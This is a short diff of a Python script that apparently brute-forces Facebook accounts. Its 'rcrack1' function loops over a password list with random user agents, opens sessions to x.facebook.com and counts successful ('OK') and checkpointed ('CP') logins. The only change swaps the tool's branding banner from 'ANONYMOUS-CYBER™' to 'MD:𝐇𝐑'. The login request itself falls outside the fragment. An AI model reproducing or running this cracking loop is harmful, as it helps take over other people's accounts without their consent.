@@ -219,7 +219,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mANONYMOUS-CYBER™\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mMD:𝐇𝐑\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://x.facebook.com').text
             log_data = {
